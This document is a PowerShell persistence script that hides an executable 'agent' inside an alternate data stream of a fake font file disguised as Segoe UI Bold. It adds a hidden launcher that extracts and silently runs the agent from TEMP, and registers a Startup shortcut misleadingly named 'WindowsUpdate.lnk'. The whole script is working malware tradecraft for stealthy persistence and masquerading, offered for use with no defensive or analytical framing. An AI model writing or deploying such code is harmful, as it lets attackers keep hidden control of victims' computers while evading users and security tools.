param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# ============================================================
# 1. Create a fake font file in the Fonts folder
# ============================================================
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
    Write-Output "[+] Created hidden fonts folder"
}

# Create a fake font file that looks legitimate
$fontFile = "$fontDir\seguibl.ttf"  # Segoe UI Bold – common Windows font
if (-not (Test-Path $fontFile)) {
    # Create a tiny fake font file (just enough to look real)
    $fakeFontContent = @"
TTF fake font file – do not delete
This is a placeholder that mimics a real font file.
Windows may use this directory for user-installed fonts.
"@
    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
    attrib +h $fontFile
    Write-Output "[+] Created fake font file: $fontFile"
} else {
    Write-Output "[+] Using existing font file: $fontFile"
}

# ============================================================
# 2. Hide the agent in an ADS attached to the font file
# ============================================================
$streamName = "Zone.Identifier"  # Looks like a legitimate security zone marker
Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$fontFile`:$streamName"

# ============================================================
# 3. Create launcher script in the same folder
# ============================================================
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"

# Extract agent from ADS
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath
Write-Output "[+] Created launcher: $launcherPath"

# ============================================================
# 4. Create shortcut in Startup folder
# ============================================================
$startupFolder = [Environment]::GetFolderPath('Startup')
$shortcutPath = "$startupFolder\WindowsUpdate.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""
$shortcut.WorkingDirectory = $fontDir
$shortcut.Save()
Write-Output "[+] Created startup shortcut: $shortcutPath"

Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Agent hidden in: $hiddenPath"
Write-Output "Font file carrier: $fontFile"
Write-Output "Agent will run at next logon via Startup folder."